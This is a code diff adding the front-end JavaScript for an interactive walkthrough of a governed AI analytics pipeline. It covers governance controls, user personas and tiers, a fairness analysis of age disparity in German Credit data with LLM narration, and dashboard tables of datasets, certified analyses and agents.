+  'CTL-PROXY-01':{t:'Proxy discrimination',stage:'Screen',a:'flag',what:'Checks whether a permitted feature quietly stands in for a protected attribute like age. Measures the real association and flags a strong one, but does not block.',why:'digital_engagement_score has a correlation ratio of 0.92 with age band, above the 0.50 threshold.',did:'Flagged it as a candidate proxy for age and put the flag in the evidence pack. Whether it is a business necessity is Legal’s call.'},
+  'CTL-EVAL-01':{t:'Narration faithfulness',stage:'Interpret',a:'pass',what:'Checks the written narrative is faithful to the screened numbers and never states a figure for a suppressed group. Also the certification quality floor of 0.90.',why:'The narration scored 0.96 and asserts no rate for the suppressed band.',did:'Passed. It also blocks certifying any analysis below 0.90, which is why cohort-retention v0.3 (0.72) is refused.'},
+  'CTL-SOD-01':{t:'Segregation of duties',stage:'Attest',a:'block',what:'Whoever signs off on a result may not be the person who produced it. A self-sign-off is refused.',why:'The run is pending an approver who is not the author.',did:'Holds the pack at pending until an independent approver signs. It is also why cohort-retention v0.3, which has no independent validator assigned, is refused.'},
+  'CTL-LIN-01':{t:'Complete lineage',stage:'Attest',a:'block',what:'Requires an unbroken provenance chain (question to dataset SHA to code to tier to approver) before a result can be attested.',why:'The chain is complete for this run.',did:'Passed and emitted OpenLineage events.'}
+};
+
+/* ---------- stages ---------- */
+const STAGES = [
+  {n:'Ask',tag:'quiet'},{n:'Plan',tag:'quiet'},{n:'Access',tag:'quiet'},{n:'Generate',tag:'quiet'},
+  {n:'Gate',tag:'caught',mark:'1 caught'},{n:'Execute',tag:'quiet'},{n:'Screen',tag:'fired',mark:'3 fired'},
+  {n:'Interpret',tag:'quiet'},{n:'Attest',tag:'quiet'},
+  {n:'Architecture',tag:'meta',mark:'overview',meta:true,glyph:'&#9638;'}
+];
+const CAPS = [
+  'Bind the request, choose data, purpose and question, and compute the tier.',
+  'Pick a certified analysis; a draft agent is invisible here.',
+  'Build the scoped view; denied columns are absent, not hidden.',
+  'The model writes code. Generating is safe; running is not.',
+  'Two parsers read the code before anything runs. Try <b>Fix it</b>.',
+  'Run the cleared code under hard sandbox limits.',
+  'Suppress small cells and test features for proxy bias.',
+  'Narrate from screened numbers only, then check faithfulness.',
+  'Assemble the evidence pack and route it for independent sign-off.',
+  'Zoom out. The whole stack: off-the-shelf maths, and the controls we built.'
+];
+
+/* framework & tools used (off-the-shelf library) vs governance implemented (controls), per stage */
+const STAGE_ENGINE = [
+  { buy: [], build: ['CTL-TIER-01','CTL-PURP-01'] },
+  { buy: [], build: ['CTL-CONTRACT-01','CTL-EVAL-01','CTL-SOD-01'] },
+  { buy: ['DuckDB','pandas'], build: ['CTL-RBAC-01','CTL-PURP-01','CTL-PURP-02'] },
+  { buy: ['Claude'], build: [] },
+  { buy: ['ast','sqlglot'], build: ['CTL-EGRESS-01','CTL-CODE-01','CTL-COL-01'] },
+  { buy: ['DuckDB'], build: ['CTL-TIME-01'] },
+  { buy: ['fairlearn','scipy.stats'], build: ['CTL-DISC-02','CTL-PROXY-01'] },
+  { buy: ['Claude'], build: ['CTL-EVAL-01'] },
+  { buy: ['OpenLineage','Quarto','marimo'], build: ['CTL-SOD-01','CTL-LIN-01'] },
+];
+function renderEngine(){
+  const bar = document.getElementById('enginebar');
+  if(current===10){ bar.style.display='none'; return; }
+  bar.style.display='';
+  const e = STAGE_ENGINE[current-1];
+  const buy = e.buy.length
+    ? e.buy.map(l=>`<span class="lib" onclick="transitionTo(10)" title="See the full stack"><span class="d"></span>${l}</span>`).join('')
+    : '<span class="lib none">policy only, no external library</span>';
+  const build = e.build.length
+    ? e.build.map(id=>`<button class="ctl ${FIRED_NOW.has(id)?'pass':'armed'}" onclick="openCtl('${id}')"><span class="st"></span>${id.replace('CTL-','')}</button>`).join('')
+    : '<span class="lib none" style="border:0">generating is safe, nothing to govern here</span>';
+  document.getElementById('enginebar').innerHTML =
+    `<span class="eb-lab">Framework &amp; Tools used</span>${buy}<span class="eb-sep"></span><span class="eb-lab">Governance implemented</span>${build}`;
+}
+
+/* ---------- faux login / personas ---------- */
+const ICON = {
+  analyst:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="7.5" r="3.5"/><path d="M5 20c0-3.9 3.1-6.5 7-6.5s7 2.6 7 6.5"/><path d="M15.6 4.4l1.3 1.3 2.5-2.8"/></svg>`,
+  person:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="7.5" r="3.5"/><path d="M5 20c0-3.9 3.1-6.5 7-6.5s7 2.6 7 6.5"/></svg>`,
+  magnifier:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="10.5" cy="10.5" r="6"/><path d="M15 15l5.5 5.5"/></svg>`,
+  stamp:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="4" width="16" height="16" rx="4"/><path d="M8.5 12.4l2.4 2.4 4.6-5.2"/></svg>`,
+  eye:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><path d="M2 12s3.6-6.5 10-6.5S22 12 22 12s-3.6 6.5-10 6.5S2 12 2 12z"/><circle cx="12" cy="12" r="2.6"/></svg>`,
+  gear:`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="3.2"/><path d="M12 3v2.5M12 18.5V21M3 12h2.5M18.5 12H21M5.6 5.6l1.8 1.8M16.6 16.6l1.8 1.8M18.4 5.6l-1.8 1.8M7.4 16.6l-1.8 1.8"/></svg>`
+};
+const PERSONAS = [
+  { id:'analyst', name:'Data Scientist', role:'First line · certified', tier:'L2', cap:'Writes gated code against the fenced API. Runs this walkthrough.', hero:true, short:'Analyst', qual:'certified', dot:'#5fdc8a', resolved:'L2', icon:ICON.analyst },
+  { id:'junior', name:'Junior Analyst', role:'First line · uncertified', tier:'L1', cap:'Picks a certified analysis and fills typed params. Writes no code.', short:'Junior Analyst', qual:'L1', dot:'#9dc0f5', resolved:'L1', icon:ICON.person },
+  { id:'validator', name:'Model Validator', role:'Second line · MRM', tier:'L0', cap:'Independently reviews fairness and evals. Does not run.', short:'Model Validator', qual:'reviews', dot:'#e7b45f', resolved:'L0', icon:ICON.magnifier },
+  { id:'approver', name:'MRM Approver', role:'Second line · sign-off', tier:'L0', cap:'Holds the promotion sign-off. Four-eyes, never self-approves.', short:'MRM Approver', qual:'approves', dot:'#e7b45f', resolved:'L0', icon:ICON.stamp },
+  { id:'auditor', name:'Internal Auditor', role:'Third line', tier:'L0', cap:'Read-only across the audit trail, evidence, and lineage.', short:'Internal Auditor', qual:'read-only', dot:'#93a4c2', resolved:'L0', icon:ICON.eye },
+  { id:'admin', name:'Platform Admin', role:'Platform', tier:'L3', cap:'May toggle a control (audited). L3 on Public data, caps at L2 here.', short:'Platform Admin', qual:'admin', dot:'#c98bf0', resolved:'L2', icon:ICON.gear }
+];
+let activePersona = PERSONAS[0];
+
+function buildPersonas(){
+  document.getElementById('persona-grid').innerHTML = PERSONAS.map(p=>`
+    <button class="pcard${p.hero?' hero':''}" onclick="pickPersona('${p.id}')" aria-label="Act as ${p.name}, tier ${p.tier}">
+      <span class="ptier">${p.tier}</span>
+      <span class="picon">${p.icon}</span>
+      <span class="pname">${p.name}</span>
+      <span class="prole">${p.role}</span>
+      <span class="pcap">${p.cap}</span>
+      ${p.hero?'<span class="phero-tag">Runs this walkthrough</span>':''}
+    </button>`).join('');
+}
+function setPersona(p){
+  activePersona = p;
+  document.getElementById('persona-chip').innerHTML =
+    `<span class="dot" style="background:${p.dot}"></span><span class="k">${p.short}</span> ${p.qual}`;
+  document.getElementById('tier-badge').textContent = p.resolved;
+  const bn = document.getElementById('idbanner');
+  if(p.id!=='analyst' && p.resolved!=='L2'){
+    document.getElementById('idbanner-in').innerHTML =
+      `<span class="m">!</span><div>Acting as <b>${p.name}</b>, who resolves to <b>${p.resolved}</b> on german_credit. This walkthrough follows the certified Analyst's <b>L2</b> run, which every reviewing identity is entitled to inspect.</div>`;
+    bn.style.display='';
+  } else {
+    bn.style.display='none';
+  }
+  demoAdmin = (p.id==='admin');
+}
+function pickPersona(id){
+  const p = PERSONAS.find(x=>x.id===id); if(!p) return;
+  setPersona(p);
+  const login = document.getElementById('login');
+  login.classList.add('leaving');
+  const done = ()=>{ login.style.display='none'; showView('home'); };
+  reduceMotion() ? done() : setTimeout(done, 280);
+}
+
+/* ---------- stage transition ("Governing" / "Thinking") ---------- */
+const TRANS = ['Binding identity','Selecting a certified analysis','Scoping the data','Writing the analysis','Reading the code','Running the sandbox','Screening the result','Composing the narration','Sealing the evidence','The full stack'];
+let pendingSub = null, transTimer = null;
+function transitionTo(n){
+  n = Math.max(1, Math.min(10, n));
+  const applySub = ()=>{ if(n===1) showSub(pendingSub || 1); pendingSub = null; };
+  if(reduceMotion()){ showStage(n); applySub(); return; }
+  const isLLM = (n===4 || n===8);
+  const verb = n===10 ? 'Zooming out' : (isLLM ? 'Thinking' : 'Governing');
+  document.getElementById('trans-verb').textContent = verb;
+  document.getElementById('trans-msg').textContent = TRANS[n-1];
+  document.getElementById('transition').classList.add('show');
+  clearTimeout(transTimer);
+  transTimer = setTimeout(()=>{ document.getElementById('transition').classList.remove('show'); showStage(n); applySub(); }, isLLM ? 950 : 620);
+}
+
+let current = 1;
+const railEl = document.getElementById('rail');
+
+function buildRail(){
+  railEl.innerHTML = STAGES.map((s,i)=>{
+    const idx=i+1;
+    const tag = s.mark ? `<span class="tag ${s.tag}">${s.mark}</span>` : `<span class="tag quiet">&middot;</span>`;
+    const aria = s.meta ? `Go to ${s.n} overview` : `Go to stage ${idx}, ${s.n}`;
+    return `<div class="step${s.meta?' meta':''}" data-idx="${idx}"><div class="connector"></div>
+      <button onclick="transitionTo(${idx})" aria-label="${aria}">
+        <span class="node" data-glyph="${s.glyph||''}">${s.glyph||idx}</span><span class="lbl">${s.n}</span>${tag}
+      </button></div>`;
+  }).join('');
+}
+let currentSub = 1;
+const reduceMotion = () => matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+function showStage(n){
+  current = Math.max(1, Math.min(10, n));
+  document.querySelectorAll('.panel').forEach(p=>p.classList.remove('show'));
+  document.getElementById('stage-'+current).classList.add('show');
+  document.querySelectorAll('.step').forEach((el)=>{
+    const idx = +el.dataset.idx;
+    el.classList.toggle('done', idx < current);
+    el.classList.toggle('active', idx === current);
+    const node = el.querySelector('.node');
+    node.innerHTML = idx < current ? '&#10003;' : (node.dataset.glyph || idx);
+  });
+  updateNav();
+  renderEngine();
+  window.scrollTo({top:0, behavior: reduceMotion() ? 'auto' : 'smooth'});
+}
+function updateNav(){
+  document.getElementById('backbtn').disabled = (current===1 && currentSub===1);
+  document.getElementById('nextbtn').disabled = (current===10);
+  document.getElementById('nextbtn').innerHTML = current===10 ? 'Done &#10003;' : (current===9 ? 'Architecture &rarr;' : 'Next &rarr;');
+  document.getElementById('stepcount').textContent = current===10 ? 'Architecture' : ('Stage '+current+' / 9');
+  let cap = CAPS[current-1];
+  if(current===1){
+    const subcap = ['choose and classify the dataset','select the purpose','pick a pre-built question'][currentSub-1];
+    cap = 'Step '+currentSub+' of 3 &mdash; '+subcap+'.';
+  }
+  document.getElementById('cap').innerHTML = cap;
+}
+function go(d){
+  if(current===1 && d>0 && currentSub<3){ showSub(currentSub+1); return; }
+  if(current===1 && d<0 && currentSub>1){ showSub(currentSub-1); return; }
+  const target = current + d;
+  if(target<1 || target>10) return;
+  pendingSub = (target===1) ? (d<0 ? 3 : 1) : null;
+  transitionTo(target);
+}
+
+/* Ask sub-steps */
+function showSub(n){
+  currentSub = n;
+  document.querySelectorAll('#asksubs .substep').forEach(el=>{
+    const idx=+el.dataset.sub;
+    el.classList.toggle('active', idx===n);
+    el.classList.toggle('done', idx<n);
+  });
+  document.querySelectorAll('.subpane').forEach(p=>p.classList.remove('show'));
+  document.getElementById('sub-'+n).classList.add('show');
+  updateNav();
+}
+
+/* Gate fix-it */
+function fixIt(){
+  const btn=document.getElementById('fixbtn');
+  btn.disabled=true; btn.innerHTML='&#9881; Regenerating&hellip;';
+  setTimeout(()=>{
+    document.getElementById('gate-attempt1').style.display='none';
+    document.getElementById('gate-attempt2').style.display='';
+    const step=document.querySelector('.step[data-idx="5"] .tag');
+    if(step){ step.className='tag'; step.style.cssText='background:var(--ok-soft);color:var(--ok-ink);border:1px solid var(--ok-border)'; step.textContent='cleared'; }
+  }, 900);
+}
+
+/* Interpret narration: scripted (shimmer) vs live (streamed tokens) */
+let narMode='scripted';
+const NAR_HTML=`
+<p>Holding income constant, the model's flag rate falls unevenly across age. Applicants aged <b>18-25</b> are flagged at <b>0.32</b>, the highest of any band, against <b>0.16</b> for the <b>36-45</b> band, the lowest. That is a <b>0.16</b> absolute gap and a <b>2.0&times;</b> relative disparity, the kind of spread a fair-lending reviewer opens a file over.</p>
+<p>The gap is unlikely to be noise: the 95% confidence interval on the disparity runs from <b>0.08 to 0.24</b>, clear of zero. It is also not a clean read. <span class="mono">digital_engagement_score</span>, one of the granted features, tracks age closely enough (correlation ratio <b>&eta; 0.92</b>) that the screen flagged it as a candidate proxy: the model may be reading age through the back door.</p>
+<p class="sup-note">Two cautions travel with this finding. It is an association, not a cause; nothing here shows that age drove the decision. And bands whose cell counts fell below the disclosure floor were removed before this summary was written, so they are not reflected in it. Whether the proxy is a legitimate business necessity is Legal's call, and the flag rides in the evidence pack so that call is made in the open.</p>`;
+const NAR_TEXT="Holding income constant, the model's flag rate falls unevenly across age. Applicants aged 18-25 are flagged at 0.32, the highest of any band, against 0.16 for the 36-45 band, the lowest. That is a 0.16 absolute gap and a 2.0x relative disparity, the kind of spread a fair-lending reviewer opens a file over. The gap is unlikely to be noise: the 95% confidence interval on the disparity runs from 0.08 to 0.24, clear of zero. It is also not a clean read. digital_engagement_score, one of the granted features, tracks age closely enough (correlation ratio 0.92) that the screen flagged it as a candidate proxy for age. Two cautions travel with this finding. It is an association, not a cause. And bands whose cell counts fell below the disclosure floor were removed before this summary was written, so they are not reflected in it.";
+function setNarMode(m){
+  narMode=m;
+  document.getElementById('seg-scripted').classList.toggle('active', m==='scripted');
+  document.getElementById('seg-live').classList.toggle('active', m==='live');
+  document.getElementById('narlabel').textContent = m==='live' ? 'live LLM, streamed under a cost cap' : 'scripted, over a live analysis';
+  document.getElementById('narbtn').innerHTML = m==='live' ? '&#9654; Stream narration (live)' : '&#9654; Generate narration';
+}
+function runNarration(){
+  document.getElementById('narstart').style.display='none';
+  const para=document.getElementById('narpara');
+  const faith=document.getElementById('narfaith');
+  const body=document.getElementById('narbody');
+  if(narMode==='live' && !reduceMotion()){
+    body.style.display='';
+    para.classList.add('caret'); para.textContent='';
+    const words=NAR_TEXT.split(' '); let i=0;
+    (function tick(){
+      if(i<words.length){ para.textContent += (i?' ':'')+words[i]; i++; setTimeout(tick,55); }
+      else { para.classList.remove('caret'); para.innerHTML=NAR_HTML; faith.style.display=''; }
+    })();
+    return;
+  }
+  if(narMode==='scripted' && !reduceMotion()){
+    document.getElementById('narpending').style.display='';
+    setTimeout(()=>{
+      document.getElementById('narpending').style.display='none';
+      body.style.display=''; para.innerHTML=NAR_HTML; faith.style.display='';
+    },1400);
+    return;
+  }
+  body.style.display=''; para.innerHTML=NAR_HTML; faith.style.display='';
+}
+
+/* control drawer with focus management */
+let lastFocus=null;
+function openCtl(id){
+  const c=CONTROLS[id]; if(!c) return;
+  document.getElementById('drawer-cid').textContent=id;
+  document.getElementById('drawer-title').textContent=c.t;
+  document.getElementById('drawer-what').textContent=c.what;
+  document.getElementById('drawer-why').textContent=c.why;
+  document.getElementById('drawer-did').textContent=c.did;
+  const ap=document.getElementById('drawer-action');
+  const [cls,label]=ACTION_STYLE[c.a]||['pass',''];
+  ap.className='actionpill ctl '+cls; ap.innerHTML='<span class="st"></span>'+label+' &middot; '+c.stage;
+  lastFocus=document.activeElement;
+  document.getElementById('scrim').classList.add('show');
+  document.getElementById('drawer').classList.add('show');
+  const cb=document.querySelector('#drawer .drawer-close'); if(cb) cb.focus();
+}
+function closeDrawer(){
+  document.getElementById('scrim').classList.remove('show');
+  document.getElementById('drawer').classList.remove('show');
+  if(lastFocus && lastFocus.focus){ lastFocus.focus(); lastFocus=null; }
+}
+
+/* controls modal + demo-admin toggles wired to the Screen stage */
+let demoAdmin=false;
+const controlState={'CTL-DISC-02':true,'CTL-PROXY-01':true};
+const TOGGLEABLE=new Set(['CTL-DISC-02','CTL-PROXY-01']);
+const FIRED_NOW=new Set(['CTL-TIER-01','CTL-PURP-01','CTL-PURP-02','CTL-CONTRACT-01','CTL-RBAC-01','CTL-RBAC-02','CTL-PII-01','CTL-CODE-01','CTL-COL-01','CTL-COMPLEX-01','CTL-EGRESS-01','CTL-TIME-01','CTL-DISC-01','CTL-DISC-02','CTL-DISC-03','CTL-PROXY-01','CTL-EVAL-01','CTL-SOD-01','CTL-LIN-01']);
+function isOn(id){ return (id in controlState) ? controlState[id] : FIRED_NOW.has(id); }
+
+function applyScreenState(){
+  const disc=controlState['CTL-DISC-02'];
+  const row=document.getElementById('supp-row'); if(row) row.classList.toggle('suppressed', disc);
+  document.getElementById('supp-note-on').style.display=disc?'':'none';
+  document.getElementById('supp-note-off').style.display=disc?'none':'';
+  document.getElementById('disc02-on').style.display=disc?'':'none';
+  document.getElementById('disc02-off').style.display=disc?'none':'';
+  const px=controlState['CTL-PROXY-01'];
+  document.getElementById('proxy-block').style.display=px?'':'none';
+  document.getElementById('proxy-off').style.display=px?'none':'';
+  const tag=document.querySelector('.step[data-idx="7"] .tag');
+  if(tag){ const off=(!disc||!px); tag.textContent=off?'overridden':'3 fired'; tag.className='tag '+(off?'caught':'fired'); }
+}
+function toggleControl(id){
+  if(!demoAdmin || !TOGGLEABLE.has(id)) return;
+  controlState[id]=!controlState[id];
+  applyScreenState(); renderControls();
+}
+function toggleDemoAdmin(v){ demoAdmin=v; renderControls(); }
+
+function renderControls(){
+  const byStage={};
+  Object.entries(CONTROLS).forEach(([id,c])=>{ (byStage[c.stage]=byStage[c.stage]||[]).push([id,c]); });
+  const order=['Ask','Access','Generate','Gate','Execute','Screen','Interpret','Attest','any'];
+  let html=`<div class="crow" style="background:var(--surface-2)"><span class="cd"><b>Viewing as</b> &mdash; only an admin may toggle a control</span>
+    <button class="seg-btn ${demoAdmin?'':'active'}" onclick="toggleDemoAdmin(false)">Analyst</button>
+    <button class="seg-btn ${demoAdmin?'active':''}" onclick="toggleDemoAdmin(true)">Platform Admin</button></div>`;
+  order.forEach(st=>{
+    if(!byStage[st]) return;
+    html+=`<div class="cgroup"><div class="gl">${st==='any'?'Cross-cutting':st}</div>`;
+    byStage[st].forEach(([id,c])=>{
+      const on=isOn(id);
+      const cls=on?'pass':(TOGGLEABLE.has(id)?'block':'armed');
+      const canToggle=demoAdmin && TOGGLEABLE.has(id);
+      const title=canToggle?'Toggle (audited)':(TOGGLEABLE.has(id)?'Switch to Platform Admin to toggle':'Admin-only, audited');
+      html+=`<div class="crow"><span class="cn ctl ${cls}" style="cursor:pointer" onclick="closeControls();openCtl('${id}')">${id}</span>
+        <span class="cd">${c.t}</span>
+        <button class="toggle ${on?'':'off'}" ${canToggle?'':'disabled'} title="${title}" onclick="toggleControl('${id}')" aria-label="${id} ${on?'enabled':'disabled'}"></button></div>`;
+    });
+    html+='</div>';
+  });
+  const note = demoAdmin
+    ? 'Acting as Platform Admin. The two Screen controls are operable; flip <b>CTL-DISC-02</b> and watch the suppressed 71-75 band survive on Stage 7. Every toggle is written to the audit log.'
+    : 'Toggles are enabled only for the Platform Admin persona, and every toggle is audited. Switch persona above to try one on the Screen controls.';
+  html+='<div class="adminnote">'+note+'</div>';
+  document.getElementById('modal-body').innerHTML=html;
+}
+function openControls(){ renderControls(); document.getElementById('modal').classList.add('show'); }
+function closeControls(){ document.getElementById('modal').classList.remove('show'); }
+
+/* theme */
+function updateThemeBtn(isDark){
+  const b=document.getElementById('themebtn');
+  b.innerHTML = isDark ? '&#9680;' : '&#9681;';
+  b.setAttribute('aria-pressed', isDark ? 'true' : 'false');
+}
+function currentIsDark(){
+  const cur=document.documentElement.getAttribute('data-theme');
+  return cur ? cur==='dark' : matchMedia('(prefers-color-scheme: dark)').matches;
+}
+function toggleTheme(){
+  const next = currentIsDark() ? 'light' : 'dark';
+  document.documentElement.setAttribute('data-theme', next);
+  updateThemeBtn(next==='dark');
+}
+
+/* attested chips rendered from the fired set so the chain cannot drift */
+function buildAttested(){
+  const el=document.getElementById('attested-chips'); if(!el) return;
+  const ids=['CTL-TIER-01','CTL-PURP-01','CTL-PURP-02','CTL-CONTRACT-01','CTL-RBAC-01','CTL-RBAC-02','CTL-PII-01','CTL-CODE-01','CTL-COL-01','CTL-COMPLEX-01','CTL-EGRESS-01','CTL-TIME-01','CTL-DISC-01','CTL-DISC-02','CTL-DISC-03','CTL-PROXY-01','CTL-EVAL-01','CTL-LIN-01'];
+  const fired=new Set(['CTL-DISC-01','CTL-DISC-02','CTL-PROXY-01']);
+  el.innerHTML=ids.map(id=>`<button class="ctl ${fired.has(id)?'fired':'pass'}" onclick="openCtl('${id}')"><span class="st"></span>${id}</button>`).join('');
+}
+
+/* ================= APP SHELL: sidebar, dashboard, platform surfaces ================= */
+/* Real prod data (datasets/registry.py, platform/{registry,certification,adoption}.py) */
+const DATASETS = [
+  {id:'german_credit', name:'UCI Statlog German Credit', cls:'Restricted', rows:'1,000', tables:1, license:'CC BY 4.0', commercial:'yes', onboarded:'yes'},
+  {id:'uci_taiwan_credit', name:'UCI Default of Credit Card Clients (Taiwan)', cls:'Restricted', rows:'30,000', tables:1, license:'CC BY 4.0', commercial:'yes', onboarded:'yes'},
+  {id:'berka', name:"PKDD'99 Financial (Berka, Czech bank)", cls:'Confidential', rows:'1,090,086', tables:8, license:'research/education', commercial:'flagged', onboarded:'yes'},
+  {id:'ulb_fraud', name:'ULB Credit Card Fraud (OpenML 1597)', cls:'Confidential', rows:'284,807', tables:1, license:'DbCL 1.0', commercial:'yes', onboarded:'yes'},
+  {id:'hillstrom', name:'Hillstrom MineThatData email', cls:'Internal', rows:'64,000', tables:1, license:'no formal license (permissive)', commercial:'flagged', onboarded:'yes'},
+  {id:'lendingclub', name:'LendingClub 2007-2018 (messy)', cls:'Internal', rows:'2,260,000', tables:1, license:'unlicensed / CC BY 4.0', commercial:'flagged', onboarded:'yes'},
+  {id:'uci_bank_marketing', name:'UCI Bank Marketing', cls:'Internal', rows:'41,188', tables:1, license:'CC BY 4.0', commercial:'yes', onboarded:'registered'},
+  {id:'synthetic_its', name:'Semi-synthetic interrupted time series', cls:'Public', rows:'365', tables:1, license:'Apache-2.0 / MIT', commercial:'yes', onboarded:'yes'},
+];
+const CLASS_ORDER = ['Restricted','Confidential','Internal','Public'];
+const CERTS = [
+  {id:'fair-lending', ver:'v1.4', author:'priya.raman', owner:'Dana Okafor', validator:'sam.mendes', contract:'german_credit@sha:188808', faith:0.94, status:'certified',
+   gates:[['Eval floor 0.90','ok','CTL-EVAL-01'],['Owner is a person','ok',''],['Data contract','ok','CTL-CONTRACT-01'],['Independent validator','ok','CTL-SOD-01']]},
+  {id:'deposit-elasticity', ver:'v0.9', author:'marcus.lee', owner:'Dana Okafor', validator:'—', contract:'berka@sha:9b0c2e', faith:0.91, status:'candidate',
+   gates:[['Eval floor 0.90','ok','CTL-EVAL-01'],['Owner is a person','ok',''],['Data contract','ok','CTL-CONTRACT-01'],['Independent validator','bad','CTL-SOD-01']]},
+  {id:'cohort-retention', ver:'v0.3', author:'priya.raman', owner:'priya.raman', validator:'—', contract:'berka@sha:9b0c2e', faith:0.72, status:'refused',
+   gates:[['Eval floor 0.90','bad','CTL-EVAL-01'],['Owner is a person','ok',''],['Data contract','ok','CTL-CONTRACT-01'],['Independent validator','bad','CTL-SOD-01']]},
+];
+const MODELS = [
+  {ver:'credit-lr-000001', q:'build_model', auc:'0.78', dr:'0.57', fair:false, status:'promoted', origin:'seeded'},
+  {ver:'credit-lr-000002', q:'fairness_age', auc:'0.71', dr:'0.52', fair:false, status:'blocked', origin:'seeded'},
+];
+const AGENTS = [
+  {id:'profiler', tpl:'data_analysis', tools:'read_columns, profile_dataset', rbac:'structural columns; PII and proxies withheld'},
+  {id:'eda', tpl:'data_analysis', tools:'read_columns, profile_dataset', rbac:'structural columns; PII and proxies withheld'},
+  {id:'modeler', tpl:'modeling', tools:'read_columns, train_model', rbac:'features only; cannot validate its own model'},
+  {id:'validator', tpl:'validation', tools:'read_columns, compute_fairness, run_eval_gate, retrieve_policy', rbac:'adds the protected attribute, for fairness only; cannot train'},
+];
+const TEMPLATES = [
+  {name:'Data-analysis agent', id:'data_analysis', pattern:'prompt_chaining', status:'live', tools:'read_columns, profile_dataset', rbac:'structural columns; PII and proxies withheld', by:'profiler, eda'},
+  {name:'Modeling agent', id:'modeling', pattern:'evaluator_optimizer', status:'live', tools:'read_columns, train_model', rbac:'features only; cannot validate its own model', by:'modeler'},
+  {name:'Validation agent', id:'validation', pattern:'evaluator_optimizer', status:'live', tools:'read_columns, compute_fairness, run_eval_gate, retrieve_policy', rbac:'adds the protected attribute, for fairness only; cannot train', by:'validator'},
+  {name:'Retrieval-QA agent', id:'retrieval_qa', pattern:'prompt_chaining', status:'available', tools:'read_columns, retrieve_policy', rbac:'corpus read; no dataset PII', by:'lands with the RAG layer'},
+  {name:'Document-summarizer agent', id:'document_summarizer', pattern:'prompt_chaining', status:'available', tools:'read_columns', rbac:'document text only; redaction enforced', by:'not yet realized'},
+];
+const PLAYBOOKS = [
+  {title:'Build a governed credit-risk model', pattern:'prompt_chaining', status:'implemented', by:'the live Sentinel pipeline'},
+  {title:'Onboard a new dataset to the platform', pattern:'prompt_chaining', status:'template', by:'the config-extension path (rbac.yaml, questions.yaml)'},
+  {title:'Stand up a reporting-automation agent', pattern:'prompt_chaining', status:'template', by:'not yet built'},
+];
+const PATTERNS = [
+  {id:'prompt_chaining', status:'in_use'}, {id:'evaluator_optimizer', status:'in_use'},
+  {id:'routing', status:'planned'}, {id:'parallelization', status:'planned'}, {id:'orchestrator_workers', status:'avoided'},
+];
+const WEEKLY = [['2026-W26',6],['2026-W27',9],['2026-W28',14]];
+
+const SICON = {
+  home:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M4 11l8-6 8 6"/><path d="M6 10v9h12v-9" stroke-linecap="round" stroke-linejoin="round"/></svg>',
+  play:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M7 5l12 7-12 7z" stroke-linejoin="round"/></svg>',
+  db:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><ellipse cx="12" cy="6" rx="7" ry="3"/><path d="M5 6v12c0 1.7 3.1 3 7 3s7-1.3 7-3V6"/><path d="M5 12c0 1.7 3.1 3 7 3s7-1.3 7-3"/></svg>',
+  check:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="4" width="16" height="16" rx="4"/><path d="M8.5 12.4l2.4 2.4 4.6-5.2" stroke-linecap="round" stroke-linejoin="round"/></svg>',
+  grid:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><rect x="4" y="4" width="7" height="7" rx="1.5"/><rect x="13" y="4" width="7" height="7" rx="1.5"/><rect x="4" y="13" width="7" height="7" rx="1.5"/><rect x="13" y="13" width="7" height="7" rx="1.5"/></svg>',
+  chart:'<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><path d="M4 20V4"/><path d="M4 20h16"/><rect x="7" y="12" width="3" height="5"/><rect x="12" y="8" width="3" height="9"/><rect x="17" y="5" width="3" height="12"/></svg>',
+};
+function statusBadge(s){
+  const map={certified:['ok','certified'],candidate:['warn','candidate'],refused:['danger','refused'],promoted:['ok','promoted'],blocked:['danger','blocked'],live:['ok','live'],available:['warn','available'],implemented:['ok','implemented'],template:['warn','template'],in_use:['ok','in use'],planned:['warn','planned'],avoided:['danger','avoided by design']};
+  const [c,t]=map[s]||['neutral',s]; return `<span class="badge ${c}">${t}</span>`;
+}
+
+/* ---------- surface renderers (return HTML) ---------- */
+function renderDatasets(){
+  const rows = DATASETS.map(d=>`<tr${d.id==='german_credit'?' class="rowgood"':''}>
+    <td class="mono">${d.id}</td><td>${d.name}</td>
+    <td><span class="cls ${d.cls.toLowerCase()}">${d.cls}</span></td>
+    <td class="num">${d.rows}</td><td class="num">${d.tables}</td><td>${d.license}</td>
+    <td>${d.commercial==='yes'?'<span class="badge ok">yes</span>':'<span class="badge warn">flagged</span>'}</td>
+    <td>${d.onboarded==='yes'?'<span class="badge ok">onboarded</span>':'<span class="badge neutral">registered</span>'}</td></tr>`).join('');
+  const counts = CLASS_ORDER.map(c=>`<span class="cls ${c.toLowerCase()}">${c} ${DATASETS.filter(d=>d.cls===c).length}</span>`).join(' ');
+  return `<p class="lede" style="margin-bottom:12px">Eight datasets, every one genuinely public. Classification is <b>simulated</b> to exercise the ladder: the tier a run can reach is capped by the data class. Restricted caps at L2, Confidential at L1.</p>
+    <div class="breakrow" style="margin-bottom:12px">${counts}</div>
+    <div class="tbl-wrap"><table><thead><tr><th>id</th><th>name</th><th>class</th><th class="num">rows</th><th class="num">tbl</th><th>license</th><th>commercial</th><th>onboarded</th></tr></thead><tbody>${rows}</tbody></table></div>
